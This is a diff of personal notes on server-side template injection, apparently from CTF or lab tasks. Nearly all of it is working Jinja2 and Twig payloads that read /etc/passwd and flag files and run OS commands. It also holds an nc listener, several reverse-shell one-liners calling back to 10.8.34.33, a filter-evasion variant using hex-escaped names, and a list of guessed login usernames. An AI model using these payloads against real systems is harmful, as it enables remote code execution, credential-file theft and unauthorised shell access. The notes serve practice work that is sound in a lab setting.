@@ -4,6 +4,7 @@ task 26
 {{''.__class__.__mro__[2].__subclasses__() }}
 #''.__class__.__mro__[2].__subclasses__()[40] = File class
 {{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
+
 {{ joiner.__init__.__globals__.os.popen('dir -a').read() }}
 {{ joiner.__init__.__globals__.os.popen('find / | grep flag').read() }}
 {{''.__class__.__mro__[2].__subclasses__()[40]('/root/flag').read() }}
@@ -12,6 +13,8 @@ request["__class__"]
 
 nc -lvnp 9001
 {{ joiner.__init__.__globals__.os.popen("bash -c 'bash -i >& /dev/tcp/10.8.34.33/9001 0>&1'").read() }}
+
+{{ joiner['__init__']['__globals__']['os']['popen']("bash -c 'bash -i >& /dev/tcp/10.8.34.33/9001 0>&1'").read() }}
 
 task 27
 
@@ -25,6 +28,26 @@ and then use dir -a
 {{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}
 
 task 29
+
+{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')("grep -rnF '/root' -e 'ssti' -i | grep -v 'binary file' -i ")|attr('read')()}}
+
+Codeby
+Support
+CodebySupport
+codeby
+support
+codebysupport
+Codeby Support
+Codeby%20Support
+CodebySupport-Login
+Codeby_Support
+Codeby-Support
+codeby_support
+codeby-support
+admin
+
+user password
+
 {{7*'7'}}
 <%=7*7%>
 a{*comment*}b
@@ -41,8 +64,7 @@ python3
 
 Twig
 
-{{self}}
-{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("bash -c 'bash -i >& /dev/tcp/10.8.34.33/9001 0>&1'")}}
+{{self}}{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("bash -c 'bash -i >& /dev/tcp/10.8.34.33/9001 0>&1'")}}
 
 Java
 
@@ -52,8 +74,6 @@ Java
 30
 
 https://infosecwriteups.com/tokyowesterns-ctf-4th-2018-writeup-part-3-1c8510dfad3f
-
-
 
 
 {{request.environ}}
@@ -99,5 +119,12 @@ did not work
 
 {{ ''['__class__']['__base__']['__subclasses__'][127].__init__.__globals__.__builtins__}}
 {{ ''['__class__'].__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
+
+
+
+
+
+
+
 
 
